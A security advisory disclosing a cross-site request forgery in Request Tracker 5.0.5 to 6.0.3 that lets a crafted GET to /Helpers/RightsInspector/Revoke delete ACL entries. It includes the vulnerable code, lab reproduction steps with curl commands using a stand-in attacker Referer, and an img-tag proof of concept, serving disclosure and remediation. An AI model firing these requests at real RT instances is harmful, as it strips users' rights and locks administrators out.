# TTA-2026-016: Request Tracker 5.0.5 through 6.0.3 cross-site request forgery in `/Helpers/RightsInspector/Revoke` revokes arbitrary ACL entries

**Severity: High** — Suggested CVSS 3.1: 7.1 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:L`)

### Title

The `Revoke` helper mutates ACL state through a single whitelisted `id` argument, so RT's automatic CSRF exemption treats it as an idempotent read and skips Referer validation.

### Summary

`/Helpers/RightsInspector/Revoke` deletes an ACL entry (`RT::ACE`) identified by a numeric `id`. RT's CSRF protection exempts a component when every supplied argument appears in `@GLOBAL_WHITELISTED_ARGS` or in a component-specific whitelist, on the stated assumption that such requests are "likely to be an idempotent request, which are not susceptible to CSRF". `id` is a global whitelisted argument. The `Revoke` component is not in `%IS_BLACKLISTED_COMPONENT`, `%IS_WHITELISTED_COMPONENT`, or `%WHITELISTED_COMPONENT_ARGS`.

As a result, `GET /Helpers/RightsInspector/Revoke?id=<ACE_ID>` passes the exemption check and never reaches the Referer comparison. A cross-site request from any origin therefore revokes the target ACL entry with the privileges of the victim's authenticated session.

The defect was reproduced dynamically on an isolated RT 5.0.5 instance and confirmed by source inspection in 5.0.10 and 6.0.3, where the component source is byte-identical apart from the copyright year and the exemption logic is unchanged.

### Affected Version

- Vendor: Best Practical Solutions, LLC
- Product: Request Tracker
- Confirmed affected version: 5.0.5 (dynamic reproduction on an isolated instance)
- Same defect present by source inspection: 5.0.10 and 6.0.3 (the newest release reviewed)
- Core components: `share/html/Helpers/RightsInspector/Revoke`, `lib/RT/Interface/Web.pm`
- Endpoint: `GET /Helpers/RightsInspector/Revoke?id=<ACE_ID>`
- Default configuration: `$RestrictReferrer` defaults to `1`, so the CSRF check is enabled

RT 5.0.5 was dynamically tested. RT 5.0.10 and RT 6.0.3 were compared at the source level only and were not executed; the claim for those versions is limited to what the unchanged source shows.

### Vulnerability Type

Cross-Site Request Forgery (CWE-352); related: Incorrect Authorization / missing state-changing-request classification (CWE-863, CWE-749).

### Affected Code

- `share/html/Helpers/RightsInspector/Revoke` — the state-changing helper; its only argument is `id`.
- `lib/RT/Interface/Web.pm` — `@GLOBAL_WHITELISTED_ARGS` (includes `id`), `%IS_BLACKLISTED_COMPONENT`, `%WHITELISTED_COMPONENT_ARGS`, `IsCompCSRFWhitelisted`, `AreCompCSRFParametersWhitelisted`, `IsPossibleCSRF`, `MaybeShowInterstitialCSRFPage`.
- `lib/RT/ACE.pm` — `Delete`, which is the only authorization gate on the operation.
- `lib/RT/Principal.pm` — `RevokeRight`, which loads the ACE and calls `Delete`.

The helper performs the delete and returns JSON:

```perl
<%ARGS>
$id => undef
</%ARGS>
<%INIT>
my $ACE = RT::ACE->new($session{CurrentUser});
$ACE->Load($id);

my $Principal = $ACE->PrincipalObj;
my $Object    = $ACE->Object;
my $Right     = $ACE->RightName;

my ($ok, $msg) = $Principal->RevokeRight(Object => $Object, Right => $Right);

$r->content_type('application/json; charset=utf-8');
$m->out(JSON({ok => $ok, msg => $msg}));
$m->abort;
</%INIT>
```

### Root Cause

Two correct decision taken in isolation combine into a bypass.

First, the helper is authorized only by delegation. `RT::Principal::RevokeRight` resolves the ACE and calls `RT::ACE::Delete`, whose only check is:

```perl
unless ($self->CurrentUser->HasRight(Right => 'ModifyACL', Object => $self->Object)) {
    return ( 0, $self->loc('Permission Denied') );
}
```

That check is correct and is not the flaw: an anonymous caller cannot delete anything. The flaw is that the browser of a user who *does* hold `ModifyACL` can be made to issue the request.

Second, RT decides whether to enforce the Referer check by inspecting the argument names rather than the component's behaviour:

```perl
our @GLOBAL_WHITELISTED_ARGS = (
    # For example, "id" is acceptable because that is how RT retrieves a
    # record.
    'id',
    'results',
    'HomeRefreshInterval',
    'NotMobile',
);

sub AreCompCSRFParametersWhitelisted {
    my $sub  = shift;
    my $ARGS = shift;

    my %leftover_args = %{ $ARGS };
    my @whitelisted_args = (@GLOBAL_WHITELISTED_ARGS, @{ $WHITELISTED_COMPONENT_ARGS{$sub} || [] });

    for my $arg (@whitelisted_args) {
        delete $leftover_args{$arg};
    }

    # If there are no arguments, then it's likely to be an idempotent
    # request, which are not susceptible to CSRF
    return !%leftover_args;
}
```

`IsCompCSRFWhitelisted` returns `1` for this component whenever the request's arguments are a subset of the whitelist, and `IsPossibleCSRF` then returns `0` before the Referer is examined:

```perl
    return 0 if IsCompCSRFWhitelisted(
        $HTML::Mason::Commands::m->request_comp->path,
        $ARGS
    );

    # if there is no Referer header then assume the worst
    return (1, "your browser did not supply a Referrer header")
        if !RequestENV('HTTP_REFERER');
```

`%IS_BLACKLISTED_COMPONENT` exists precisely to exempt non-idempotent components from that inference, but it contains one entry:

```perl
our %IS_BLACKLISTED_COMPONENT = (
    # Takes only id and toggles bookmark state
    '/Helpers/Toggle/TicketBookmark' => 1,
);
```

The `Revoke` helper has the same shape as the one component already known to be non-idempotent with just an `id`, and is missing from that list. `%WHITELISTED_COMPONENT_ARGS` whitelists the RightsInspector *search* helper and the admin page, but not `Revoke`, so nothing else covers it.

Version status:

| Version | `Revoke` component | `@GLOBAL_WHITELISTED_ARGS` contains `id` | `%IS_BLACKLISTED_COMPONENT` contains `Revoke` | Result |
| --- | --- | --- | --- | --- |
| 5.0.5 | vulnerable | yes | no | request exempted, Referer not checked |
| 5.0.10 | byte-identical | yes | no | request exempted, Referer not checked |
| 6.0.3 | byte-identical | yes | no | request exempted, Referer not checked |

Relevant source locations: `lib/RT/Interface/Web.pm` `@GLOBAL_WHITELISTED_ARGS` at 1544 (5.0.5), 1619 (5.0.10), 1790 (6.0.3); `%IS_BLACKLISTED_COMPONENT` at 1584, 1659, 1825; `IsCompCSRFWhitelisted` at 1589, 1664, 1830; `AreCompCSRFParametersWhitelisted` at 1631, 1706, 1872; `IsPossibleCSRF` at 1691, 1782, 1948; the call site in `HandleRequest` at 428 and 486.

The 6.0.3 code adds one exemption — `return 1 if $IS_WHITELISTED_COMPONENT{$comp} || $comp =~ m{^(?:/SelfService)?/Views/};` — which does not cover this helper, and it removes `HomeRefreshInterval` from the global argument list while keeping `id`.

### Steps to Reproduce

Use a disposable lab instance. Every value below is synthetic.

1. Deploy RT 5.0.5 in an isolated environment and set `RT_BASE` to the lab URL, for example `http://<LAB_HOST>/rt`.
2. Create two synthetic principals, `lab-admin` (granted the superuser right, so it holds `ModifyACL` everywhere) and `lab-user`. Log in as `lab-admin` in a browser and export the lab-only cookie jar to `lab-admin.jar`.
3. Create a synthetic ACL entry to destroy, for example grant `ShowSearchAdvanced` to `lab-user` on the system object, and record its ACE id as `<SYNTHETIC_ACE_ID>`. Confirm the row exists:

   ```sql
   SELECT id, PrincipalType, PrincipalId, RightName, ObjectType, ObjectId
   FROM ACL WHERE id = <SYNTHETIC_ACE_ID>;
   ```

4. As a negative control, send the same shape to the component that RT already blacklists, with a foreign Referer:

   ```bash
   curl -sS -b lab-admin.jar -e 'http://evil.attacker.test/poc.html' \
     "$RT_BASE/Helpers/Toggle/TicketBookmark?id=<SYNTHETIC_TICKET_ID>" \
     -o control-blacklisted.html
   ```

   Expected (safe) result: the CSRF interstitial is rendered (`<title>Possible cross-site request forgery</title>`) and the application log records `Possible CSRF: ...`.

5. Second negative control: add one argument that is not whitelisted to the target request itself.

   ```bash
   curl -sS -b lab-admin.jar -e 'http://evil.attacker.test/poc.html' \
     "$RT_BASE/Helpers/RightsInspector/Revoke?id=<SYNTHETIC_ACE_ID>&canary=1" \
     -o control-extra-arg.html
   ```

   Expected (safe) result: the same interstitial is rendered. This isolates the cause to the argument-name heuristic, not to the component's absence of a token.

6. Vulnerable request — identical, minus the extra argument:

   ```bash
   curl -sS -b lab-admin.jar -e 'http://evil.attacker.test/poc.html' \
     "$RT_BASE/Helpers/RightsInspector/Revoke?id=<SYNTHETIC_ACE_ID>" \
     -o revoke-result.json
   ```

   Vulnerable result (HTTP 200, `application/json`):

   ```json
   {"msg":"Revoked right 'ShowSearchAdvanced' from lab-user.","ok":1}
   ```

7. Confirm the row is gone:

   ```sql
   SELECT count(*) FROM ACL WHERE id = <SYNTHETIC_ACE_ID>;
   ```

   Vulnerable result: `0`.

8. Confirm the same request without a session cookie does nothing useful, so the effect is attributable to the victim's session rather than to an unauthenticated path:

   ```bash
   curl -sS -e 'http://evil.attacker.test/poc.html' \
     "$RT_BASE/Helpers/RightsInspector/Revoke?id=<SYNTHETIC_ACE_ID_2>"
   ```

   Expected: a login redirect, and the ACE remains present. Restore the lab database snapshot afterwards.

A browser-driven variant of step 6 is a page on any origin containing `<img src="http://<rt-host>/Helpers/RightsInspector/Revoke?id=<SYNTHETIC_ACE_ID>">`, opened while `lab-admin` is logged in to RT. The request is a top-level-free GET with no custom headers and no token, so no preflight or confirmation step applies.

### Impact

An attacker who can get a privileged RT user to load a page, image, or link revokes arbitrary ACL entries with that user's authority. Concretely:

- Rights can be stripped from `Everyone`, from a group, or from a queue, silently removing access for other users and breaking workflows; the change persists across restarts and is only visible in the ACL administration pages.
- A user's own `ModifyACL` entry can be revoked, locking administrators out of rights administration.
- Because the response is JSON and the request is a plain GET, the operation is invisible in the victim's browser; it can be repeated for many ACE ids from one page load.
- The effect is limited to deletion of existing ACL entries — the helper cannot grant rights, so it is an integrity and availability impact on authorization configuration, not direct escalation or disclosure.

The attacker gains no new access; the victim must already hold `ModifyACL` on the target object. In practice that means RT administrators, queue administrators, and any user delegated rights administration.

### CVSS

`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:L` — 7.1 High.

The score models a remote attacker with no prior privilege who must induce one action by an authenticated privileged user; impact is unauthorized modification of the authorization configuration plus partial loss of access for legitimate users.

## Status

Published as TTA-2026-016 on 2026-10-28. Not reported to the vendor before publication; this repository's prior RT advisories (TTA-2026-001 through TTA-2026-004) received no vendor response at `security@bestpractical.com` after the 2026-10-23 notice, and this report follows the same publication path. CVE eligibility is pending; no CVE has been assigned.

## Prerequisites

- RT is reachable by the victim's browser and `$RestrictReferrer` is enabled (the default).
- The victim holds `ModifyACL` on the object that owns the target ACL entry.
- The victim is logged in to RT in the same browser and visits attacker-controlled content.
- The attacker knows or guesses an ACE id. Ids are sequential integers, and the RightsInspector pages expose them to anyone who reaches those pages.

No RT credential, session value, or administrator action beyond loading a page is required from the attacker.

## Relationship to existing CVEs

- [CVE-2026-41074](https://www.cve.org/CVERecord?id=CVE-2026-41074) (GHSA-265j-qx4w-256j) concerns RT's Referer-based CSRF protection and is published for RT 6.0.0 through 6.0.3 only. Its fix does not add this helper to `%IS_BLACKLISTED_COMPONENT`, and it does not cover the 5.x series. The component and the exemption logic in 6.0.3 remain in the state described above.
- [CVE-2026-44231](https://www.cve.org/CVERecord?id=CVE-2026-44231), [CVE-2026-41075](https://www.cve.org/CVERecord?id=CVE-2026-41075), [CVE-2026-44230](https://www.cve.org/CVERecord?id=CVE-2026-44230) and [CVE-2026-44229](https://www.cve.org/CVERecord?id=CVE-2026-44229) concern REST2 token exposure, REST2 query construction, reflected XSS, and inline-served uploads respectively, and are unrelated to this path.

Whether this is a distinct CVE, an incomplete fix for CVE-2026-41074, or a version-range correction is for Best Practical or the assigning CNA to decide. The report is submitted with that question open.

## Recommended remediation

- Add `'/Helpers/RightsInspector/Revoke' => 1` to `%IS_BLACKLISTED_COMPONENT` as an immediate, minimal fix.
- Stop inferring idempotency from argument names. Require an explicit per-component declaration of whether a component mutates state, and default to enforcing the Referer and token checks when the declaration is absent.
- Require state-changing helpers to accept POST with a CSRF token, and reject non-`POST` methods for them at the dispatcher rather than in each component.
- Keep the `ModifyACL` check in `RT::ACE::Delete` and add a regression test that sends `GET /Helpers/RightsInspector/Revoke?id=<id>` with a foreign `Referer` and asserts that the ACE survives.
- Audit the remaining `/Helpers/*` components that accept only `id` for the same classification error.

## Validation controls

| Case | Expected result |
| --- | --- |
| `GET /Helpers/RightsInspector/Revoke?id=<ACE>` with foreign Referer, privileged session | ACE deleted before fix; must be rejected after fix |
| Same request with one non-whitelisted extra argument | Rejected by the CSRF interstitial (proves the heuristic is the cause) |
| `GET /Helpers/Toggle/TicketBookmark?id=<id>` with foreign Referer | Rejected by the CSRF interstitial (existing blacklist behaviour) |
| `GET /Helpers/RightsInspector/Revoke?id=<ACE>` without a session | Login redirect, ACE unchanged |
| Same-origin navigation to the helper from the RightsInspector page | Must continue to work after the fix |

## Evidence boundary

The request, response, and ACL state change above were reproduced on an isolated RT 5.0.5 laboratory instance with synthetic principals and a synthetic ACL entry, and the instance was restored from a snapshot afterwards. No customer hostname, IP address, credential, cookie, session value, or production ACL data is included. The version comparison for 5.0.10 and 6.0.3 is a source review of the public upstream repository, not a dynamic test.

## Timeline

- 2026-10-09: Reproduced on an isolated RT 5.0.5 instance.
- 2026-10-28: Cross-version source review completed; public TTA report published.
